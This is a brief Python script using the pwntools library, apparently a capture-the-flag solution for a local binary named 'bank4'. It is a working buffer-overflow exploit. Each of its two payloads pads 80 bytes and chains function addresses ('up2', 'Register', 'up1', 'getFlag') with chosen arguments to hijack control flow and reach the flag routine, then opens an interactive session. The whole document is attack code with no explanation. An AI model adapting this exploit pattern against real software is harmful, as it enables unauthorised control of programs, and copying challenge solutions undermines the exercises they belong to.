from pwn import *

context.binary = elf = ELF('./bank4')
p = process(elf.path)

p.sendline(b'x'*80 + p32(elf.symbols['up2']) + p32(elf.symbols['Register']) + p32(1) + p32(1) + p32(0x12345678))
p.sendline(b'x'*80 + p32(elf.symbols['up1']) + p32(elf.symbols['getFlag']) + p32(0x1337) + p32(0xdead))

p.interactive()